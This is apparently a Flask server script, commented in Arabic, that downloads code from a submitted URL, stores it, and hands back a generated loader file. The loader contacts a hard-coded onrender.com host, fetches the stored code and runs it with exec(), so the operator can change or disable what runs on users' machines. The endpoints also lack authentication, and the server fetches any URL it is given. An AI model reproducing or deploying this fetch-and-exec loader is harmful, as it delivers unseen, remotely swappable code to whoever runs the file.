from flask import Flask, request, send_file, jsonify
import requests
import io
import uuid
import json
import os
from datetime import datetime

app = Flask(__name__)
TOOLS_FILE = "tools.json"

# تحميل الأدوات من الملف
def load_tools():
    try:
        with open(TOOLS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

# حفظ الأدوات في الملف
def save_tools(tools):
    with open(TOOLS_FILE, 'w') as f:
        json.dump(tools, f, indent=2)

@app.route('/')
def home():
    tools = load_tools()
    return f'✅ السيرفر شغال | عدد الأدوات: {len(tools)}'

@app.route('/upload', methods=['POST'])
def upload():
    """رفع أداة جديدة"""
    data = request.json
    tool_url = data.get('url')
    tool_name = data.get('name', 'أداة')
    
    if not tool_url:
        return jsonify({"error": "الرابط مطلوب"}), 400
    
    try:
        # تحميل الأداة من الرابط
        response = requests.get(tool_url, timeout=10)
        
        if response.status_code != 200:
            return jsonify({"error": f"فشل التحميل: {response.status_code}"}), 400
        
        # حفظ الأداة
        tool_id = str(uuid.uuid4())[:8]
        tools = load_tools()
        tools[tool_id] = {
            "name": tool_name,
            "code": response.text,
            "created_at": datetime.now().isoformat(),
            "active": True
        }
        save_tools(tools)
        
        # إنشاء ملف التشغيل
        loader = f'''import requests, sys
SERVER_URL = "https://server-3-mzac.onrender.com"
TOOL_ID = "{tool_id}"
try:
    r = requests.get(f"{{SERVER_URL}}/get/{{TOOL_ID}}", timeout=10)
    if r.status_code == 200:
        exec(r.text)
    else: print(f"❌ فشل: {{r.status_code}}")
except Exception as e: print(f"❌ {{e}}")'''
        
        return send_file(
            io.BytesIO(loader.encode()),
            mimetype='text/x-python',
            as_attachment=True,
            download_name=f'tool_{tool_id}.py'
        )
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/get/<tool_id>')
def get_tool(tool_id):
    """جلب كود الأداة"""
    tools = load_tools()
    
    if tool_id not in tools:
        return jsonify({"error": "الأداة غير موجودة"}), 404
    
    if not tools[tool_id].get("active", True):
        return jsonify({"error": "الأداة موقفة"}), 403
    
    return tools[tool_id]["code"]

@app.route('/list')
def list_tools():
    """عرض جميع الأدوات"""
    tools = load_tools()
    return jsonify({
        "count": len(tools),
        "tools": [{"id": tid, "name": info["name"], "active": info.get("active", True)} 
                  for tid, info in tools.items()]
    })

@app.route('/clean', methods=['POST'])
def clean():
    """حذف جميع الأدوات"""
    count = len(load_tools())
    save_tools({})
    return jsonify({"status": "✅ تم التنظيف", "deleted": count})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
